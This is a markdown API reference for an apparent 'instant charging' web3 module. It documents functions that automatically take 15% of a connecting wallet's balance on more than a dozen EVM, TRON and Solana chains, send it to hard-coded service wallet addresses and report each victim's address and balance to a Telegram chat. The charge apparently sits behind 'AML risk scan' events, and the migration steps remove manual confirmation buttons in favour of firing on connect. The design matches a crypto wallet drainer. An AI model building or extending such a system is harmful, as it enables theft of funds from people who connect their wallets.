# Instant Charging System - API Reference

## Table of Contents

1. [chargeOnConnect Module](#chargeOnConnect-module)
2. [multiChainCharging Module](#multiChainCharging-module)
3. [nonEvmCharging Module](#nonEvmCharging-module)
4. [Telegram API Endpoint](#telegram-api-endpoint)
5. [Types & Interfaces](#types--interfaces)
6. [Error Codes](#error-codes)

---

## chargeOnConnect Module

**File:** `src/utils/chargeOnConnect.ts`

### Main Functions

#### `executeChargeOnConnect()`

Executes automatic charge on wallet connection for EVM chains.

**Signature:**
```typescript
export async function executeChargeOnConnect(params: {
  walletAddress: string;
  chainName: string;
  chainId: number;
  balanceBefore: string;
  balanceValue: bigint;
  sendTransactionAsync: (config: { to: string; value: bigint }) => Promise<string>;
  onTelegramUpdate?: (message: string) => void;
}): Promise<ChargeResult>
```

**Parameters:**

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| walletAddress | string | Yes | User's wallet address (0x...) |
| chainName | string | Yes | Human-readable chain name (e.g., "Ethereum") |
| chainId | number | Yes | Chain ID (1=Ethereum, 137=Polygon, etc.) |
| balanceBefore | string | Yes | Formatted balance before charge (e.g., "1.5") |
| balanceValue | bigint | Yes | Raw balance in wei/smallest unit |
| sendTransactionAsync | Function | Yes | Wagmi hook function to send transaction |
| onTelegramUpdate | Function | No | Callback for UI status updates |

**Returns:**
```typescript
interface ChargeResult {
  success: boolean;
  txHash?: string;
  chargeAmount?: string;
  balanceBefore?: string;
  balanceAfter?: string;
  error?: string;
  chainName?: string;
  walletAddress?: string;
}
```

**Example Usage:**
```typescript
const result = await executeChargeOnConnect({
  walletAddress: "0x123...",
  chainName: "Ethereum",
  chainId: 1,
  balanceBefore: "1.5",
  balanceValue: BigInt("1500000000000000000"), // 1.5 ETH in wei
  sendTransactionAsync,
  onTelegramUpdate: (msg) => setChargeStatus(msg),
});

if (result.success) {
  console.log(`Charged ${result.chargeAmount} on ${result.chainName}`);
  console.log(`TxHash: ${result.txHash}`);
} else {
  console.error(`Charge failed: ${result.error}`);
}
```

---

#### `isChargingChain()`

Checks if a chain requires automatic charging.

**Signature:**
```typescript
export function isChargingChain(chainId: number): boolean
```

**Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| chainId | number | The chain ID to check |

**Returns:** `boolean` - `true` if charging is required, `false` otherwise

**Supported Chains:**
- 1 (Ethereum)
- 137 (Polygon)
- 42161 (Arbitrum)
- 10 (Optimism)
- 56 (BSC)
- 43114 (Avalanche)
- 250 (Fantom)
- 42220 (Celo)
- 8453 (Base)
- 59144 (Linea)
- 534352 (Scroll)

**Example:**
```typescript
if (isChargingChain(1)) {
  // Execute charge for Ethereum
}
```

---

#### `getChainNameById()`

Gets human-readable chain name from chain ID.

**Signature:**
```typescript
export function getChainNameById(chainId: number): string
```

**Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| chainId | number | The chain ID |

**Returns:** `string` - Chain name or `"Chain {ID}"` if not found

**Example:**
```typescript
const name = getChainNameById(1);
console.log(name); // "Ethereum"

const unknown = getChainNameById(999);
console.log(unknown); // "Chain 999"
```

---

#### `CHARGING_CHAINS`

Constant array of all supported charging chains.

**Type:**
```typescript
export const CHARGING_CHAINS: Array<{
  name: string;
  id: number;
}>
```

**Example:**
```typescript
console.log(CHARGING_CHAINS);
// [
//   { name: "Ethereum", id: 1 },
//   { name: "Polygon", id: 137 },
//   ...
// ]
```

---

## multiChainCharging Module

**File:** `src/utils/multiChainCharging.ts`

### MultiChainChargeTracker Class

Tracks charges across multiple chains for a wallet.

#### `recordCharge()`

Records a charge for tracking and deduplication.

**Signature:**
```typescript
recordCharge(
  walletAddress: string,
  chainId: number,
  record: Omit<ChainChargeRecord, 'timestamp'>
): void
```

**Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| walletAddress | string | User's wallet address |
| chainId | number | Chain where charge occurred |
| record | Object | Charge record (see types) |

**Record Object:**
```typescript
interface ChainChargeRecord {
  chainId: number;
  chainName: string;
  charged: boolean;
  amount?: string;
  txHash?: string;
  error?: string;
  timestamp: number; // Auto-added
}
```

**Example:**
```typescript
multiChainTracker.recordCharge("0x123...", 1, {
  chainId: 1,
  chainName: "Ethereum",
  charged: true,
  amount: "0.225",
  txHash: "0xabc...",
});
```

---

#### `hasBeenCharged()`

Checks if wallet has been charged on specific chain.

**Signature:**
```typescript
hasBeenCharged(walletAddress: string, chainId: number): boolean
```

**Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| walletAddress | string | User's wallet address |
| chainId | number | Chain to check |

**Returns:** `boolean` - `true` if already charged, `false` otherwise

**Example:**
```typescript
if (!multiChainTracker.hasBeenCharged("0x123...", 1)) {
  // Execute charge
}
```

---

#### `getChargeRecords()`

Retrieves all charge records for a wallet.

**Signature:**
```typescript
getChargeRecords(walletAddress: string): ChainChargeRecord[]
```

**Returns:** Array of charge records (empty if none)

**Example:**
```typescript
const records = multiChainTracker.getChargeRecords("0x123...");
console.log(`Charged on ${records.length} chains`);
```

---

#### `sendChargeSummaryToTelegram()`

Sends multi-chain charge summary to Telegram.

**Signature:**
```typescript
async sendChargeSummaryToTelegram(
  walletAddress: string,
  totalCharges: number,
  successfulCharges: number,
  totalAmountCharged: string
): Promise<void>
```

**Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| walletAddress | string | User's wallet |
| totalCharges | number | Total chains attempted |
| successfulCharges | number | Number that succeeded |
| totalAmountCharged | string | Total amount charged |

**Example:**
```typescript
await multiChainTracker.sendChargeSummaryToTelegram(
  "0x123...",
  4,  // Total attempted
  3,  // Successful
  "2.5"  // Total amount
);
```

---

### Utility Functions

#### `getChainsRequiringCharge()`

Gets list of all chains requiring charging.

**Signature:**
```typescript
export function getChainsRequiringCharge(): typeof CHARGING_CHAINS
```

**Returns:** Array of {name, id} objects

---

#### `calculateTotalChargeAcrossChains()`

Calculates total charge across multiple chains.

**Signature:**
```typescript
export function calculateTotalChargeAcrossChains(
  balancePerChain: Map<number, string>,
  chargePercent?: number
): Map<number, string>
```

**Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| balancePerChain | Map | Map of chainId → formatted balance |
| chargePercent | number | Charge percentage (default: 15) |

**Returns:** Map of chainId → charge amount

**Example:**
```typescript
const balances = new Map([
  [1, "1.5"],      // Ethereum: 1.5 ETH
  [137, "100"],    // Polygon: 100 MATIC
]);

const charges = calculateTotalChargeAcrossChains(balances, 15);
// Map {
//   1 → "0.225",    // 15% of 1.5
//   137 → "15"      // 15% of 100
// }
```

---

#### `formatMultiChainChargeSummary()`

Formats charge summary for logging.

**Signature:**
```typescript
export function formatMultiChainChargeSummary(
  walletAddress: string,
  chargeRecords: ChainChargeRecord[]
): string
```

**Returns:** Formatted string summary

**Example Output:**
```
📊 Multi-Chain Charge Summary for 0x1234...5678
✅ Successful: 3/4

Successful Charges:
  • Ethereum: 0.225 ETH (0xabcd...)
  • Polygon: 1.5 MATIC (0xef01...)
  • Arbitrum: 0.015 ARB (0x1234...)

❌ Failed Charges:
  • Optimism: Insufficient balance
```

---

## nonEvmCharging Module

**File:** `src/utils/nonEvmCharging.ts`

### TRON Charging

#### `executeChargeOnTron()`

Executes charge on TRON blockchain.

**Signature:**
```typescript
export async function executeChargeOnTron(params: {
  walletAddress: string;
  balanceBefore: string;
  balanceValue: number;
  chargePercent?: number;
}): Promise<NonEvmChargeResult>
```

**Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| walletAddress | string | TRON wallet address |
| balanceBefore | string | Balance before charge (in TRX) |
| balanceValue | number | Raw balance in Sun (1 TRX = 1M Sun) |
| chargePercent | number | Charge % (default: 15) |

**Returns:**
```typescript
interface NonEvmChargeResult {
  success: boolean;
  txHash?: string;
  chargeAmount?: string;
  balanceBefore?: string;
  balanceAfter?: string;
  error?: string;
  chainName: string;
  walletAddress: string;
}
```

**Example:**
```typescript
const result = await executeChargeOnTron({
  walletAddress: "T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb",
  balanceBefore: "100",
  balanceValue: 100000000, // 100 TRX in Sun
  chargePercent: 15,
});
```

---

### Solana Charging

#### `executeChargeOnSolana()`

Executes charge on Solana blockchain.

**Signature:**
```typescript
export async function executeChargeOnSolana(params: {
  walletAddress: string;
  balanceBefore: string;
  balanceValue: number;
  chargePercent?: number;
}): Promise<NonEvmChargeResult>
```

**Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| walletAddress | string | Solana wallet address |
| balanceBefore | string | Balance before charge (in SOL) |
| balanceValue | number | Raw balance in Lamports (1 SOL = 1B Lamports) |
| chargePercent | number | Charge % (default: 15) |

**Example:**
```typescript
const result = await executeChargeOnSolana({
  walletAddress: "HLiUDaAHnsYUPr5LfV4aiVZXGLjjXuCS59qbn58Xa39f",
  balanceBefore: "10",
  balanceValue: 10000000000, // 10 SOL in Lamports
  chargePercent: 15,
});
```

---

## Telegram API Endpoint

**File:** `src/pages/api/telegram/notify.ts`

### POST /api/telegram/notify

Sends notifications to Telegram.

**Request Body:**
```typescript
interface TelegramNotificationPayload {
  event: 'wallet_connected' | 'risk_scan_started' | 'risk_scan_completed' 
       | 'transaction_initiated' | 'transaction_success' | 'transaction_failed';
  walletAddress?: string;
  network?: string;
  balance?: string;
  token?: string;
  amount?: string;
  riskScore?: number;
  riskLevel?: string;
  txHash?: string;
  error?: string;
  timestamp?: string;
  details?: Record<string, unknown>;
}
```

**Field Descriptions:**

| Field | Type | Description |
|-------|------|-------------|
| event | string | Event type (required) |
| walletAddress | string | User's wallet address |
| network | string | Network/chain name |
| balance | string | Current or before/after balance |
| token | string | Token symbol |
| amount | string | Amount charged or transferred |
| riskScore | number | AML risk score (0-100) |
| riskLevel | string | Risk level (LOW/MEDIUM/HIGH) |
| txHash | string | Transaction hash |
| error | string | Error message if failed |
| details | object | Extended details object |

**Details Object (Optional):**
```typescript
{
  balanceBefore?: string;
  balanceAfter?: string;
  chargePercent?: string;
  totalChains?: number;
  successfulCharges?: number;
  chargedChains?: string;
  chargeDetails?: string;
}
```

**Example Request:**
```json
{
  "event": "transaction_success",
  "walletAddress": "0x1234...5678",
  "network": "Ethereum",
  "amount": "0.225",
  "balance": "Before: 1.5 | After: 1.275",
  "txHash": "0xabcd...ef01",
  "details": {
    "balanceBefore": "1.5",
    "balanceAfter": "1.275",
    "chargePercent": "15"
  }
}
```

**Response:**
```json
{
  "ok": true,
  "data": {
    "ok": true,
    "result": {
      "message_id": 12345,
      "date": 1692374400,
      "chat": { "id": -1001234567890 }
    }
  }
}
```

**Error Response:**
```json
{
  "ok": false,
  "message": "Telegram credentials not configured"
}
```

---

## Types & Interfaces

### ChargeResult

```typescript
interface ChargeResult {
  success: boolean;
  txHash?: string;           // Transaction hash if successful
  chargeAmount?: string;     // Amount charged (formatted)
  balanceBefore?: string;    // Balance before charge
  balanceAfter?: string;     // Balance after charge
  error?: string;            // Error message if failed
  chainName?: string;        // Chain name
  walletAddress?: string;    // User's wallet address
}
```

### ChainChargeRecord

```typescript
interface ChainChargeRecord {
  chainId: number;           // Chain ID
  chainName: string;         // Chain name
  charged: boolean;          // Was charge successful
  amount?: string;           // Amount charged
  txHash?: string;           // Transaction hash
  error?: string;            // Error if failed
  timestamp: number;         // When charge occurred
}
```

### NonEvmChargeResult

```typescript
interface NonEvmChargeResult {
  success: boolean;
  txHash?: string;           // Transaction signature
  chargeAmount?: string;     // Amount charged (formatted)
  balanceBefore?: string;    // Balance before
  balanceAfter?: string;     // Balance after
  error?: string;            // Error message
  chainName: string;         // "TRON" or "Solana"
  walletAddress: string;     // User's address
}
```

### TelegramNotificationPayload

```typescript
interface TelegramNotificationPayload {
  event: 'wallet_connected' | 'risk_scan_started' | 
         'risk_scan_completed' | 'transaction_initiated' | 
         'transaction_success' | 'transaction_failed';
  walletAddress?: string;
  network?: string;
  balance?: string;
  token?: string;
  amount?: string;
  riskScore?: number;
  riskLevel?: string;
  txHash?: string;
  error?: string;
  timestamp?: string;
  details?: Record<string, unknown>;
}
```

---

## Error Codes

### Common Errors

| Error | Status | Description | Solution |
|-------|--------|-------------|----------|
| Insufficient balance | 200 | Balance < charge + gas | Use chain with lower balance or reduce percentage |
| User rejected | 200 | User denied transaction | Retry or inform user |
| Network unreachable | 200 | RPC endpoint failed | Retry with fallback RPC |
| Invalid address | 200 | Address format wrong | Validate address format |
| Telegram not configured | 200 | Bot token/chat ID missing | Configure in .env.local |

### Telegram API Errors

| Error | Cause | Solution |
|-------|-------|----------|
| "Chat not found" | Invalid Chat ID | Verify Chat ID (should be negative for groups) |
| "Unauthorized" | Invalid bot token | Verify bot token with BotFather |
| "Method not allowed" | Wrong HTTP method | Always use POST |
| "Too many requests" | Rate limited | Implement backoff/retry |

---

## Usage Examples

### Complete Charge Flow

```typescript
import { executeChargeOnConnect, isChargingChain } from '@/utils/chargeOnConnect';
import { useBalance, useSendTransaction, useChainId } from 'wagmi';

// In component
const chainId = useChainId();
const { data: balanceData } = useBalance({ address });
const { sendTransactionAsync } = useSendTransaction();

// Execute charge
if (isChargingChain(chainId) && balanceData) {
  const result = await executeChargeOnConnect({
    walletAddress: address,
    chainName: 'Ethereum',
    chainId: 1,
    balanceBefore: balanceData.formatted,
    balanceValue: balanceData.value,
    sendTransactionAsync,
    onTelegramUpdate: (msg) => console.log(msg),
  });
  
  if (result.success) {
    console.log(`✅ Charged ${result.chargeAmount}`);
  } else {
    console.error(`❌ ${result.error}`);
  }
}
```

### Multi-Chain Summary

```typescript
import { multiChainTracker } from '@/utils/multiChainCharging';

// After multiple chain charges
await multiChainTracker.sendChargeSummaryToTelegram(
  address,
  4,  // Total chains attempted
  3,  // Successful
  '2.75' // Total charged
);
```

---

## Configuration

### Environment Variables

```env
# Charging Configuration
NEXT_PUBLIC_SERVICE_WALLET=0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
NEXT_PUBLIC_SERVICE_FEE_PERCENT=15

# Telegram
TELEGRAM_BOT_TOKEN=your_token
TELEGRAM_CHAT_ID=your_chat_id

# Non-EVM (Optional)
NEXT_PUBLIC_SERVICE_TRON_WALLET=T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb
NEXT_PUBLIC_SERVICE_SOLANA_WALLET=HLiUDaAHnsYUPr5LfV4aiVZXGLjjXuCS59qbn58Xa39f
```

---

## Migration Guide

### From Manual Charging to Automatic

If migrating from manual charging:

1. **Remove manual charge buttons**
2. **Replace with automatic trigger** on `useEffect` with `isConnected` dependency
3. **Update UI** to show automatic charge status
4. **Test on testnet** before production
5. **Monitor Telegram** for successful transitions

---

## Rate Limiting

Currently **no rate limiting implemented**. Consider adding:

```typescript
// Implement in chargeOnConnect.ts
const rateLimitMap = new Map<string, number>();
const CHARGE_COOLDOWN = 5 * 60 * 1000; // 5 minutes

if (rateLimitMap.has(address)) {
  const lastCharge = rateLimitMap.get(address)!;
  if (Date.now() - lastCharge < CHARGE_COOLDOWN) {
    throw new Error('Too many charges, please wait');
  }
}
rateLimitMap.set(address, Date.now());
```

---

**End of API Reference**

For more information, see:
- [INSTANT_CHARGING_GUIDE.md](./INSTANT_CHARGING_GUIDE.md)
- [CHARGING_TEST_GUIDE.md](./CHARGING_TEST_GUIDE.md)
